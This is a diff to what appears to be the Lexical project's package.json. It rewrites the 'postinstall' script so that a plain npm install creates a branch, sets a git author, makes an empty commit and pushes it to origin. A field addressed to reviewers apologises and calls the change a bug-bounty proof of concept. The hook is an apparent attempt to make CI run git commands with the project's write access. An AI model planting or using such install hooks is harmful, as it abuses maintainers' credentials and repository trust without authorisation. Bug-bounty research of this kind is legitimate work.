@@ -13,7 +13,7 @@
   },
   "engineStrict": true,
   "scripts": {
-    "postinstall": "git checkout origin/master && git branch -c test-branch-123 && git config user.name 'Aaron Dewes' && git config user.email 'aaron@nirvati.org' && git commit -m 'Test commit' --allow-empty && git push -u origin test-branch-123",
+    "postinstall": "git checkout 03be16991e58ccab26328d30533f765635646b2c && git branch -c test-branch-123 && git config user.name 'Aaron Dewes' && git config user.email 'aaron@nirvati.org' && git commit -m 'Test commit' --allow-empty && git push -u origin test-branch-123",
     "note-for-reviewers": "I apologize for testing this, but it is purely a PoC I will report through your Bug Bounty if it works",
     "start": "cross-env NODE_ENV=development concurrently \"npm:collab\" \"npm run dev --prefix packages/lexical-playground\"",
     "start:website": "npm run start --prefix packages/lexical-website -- --port 3001",
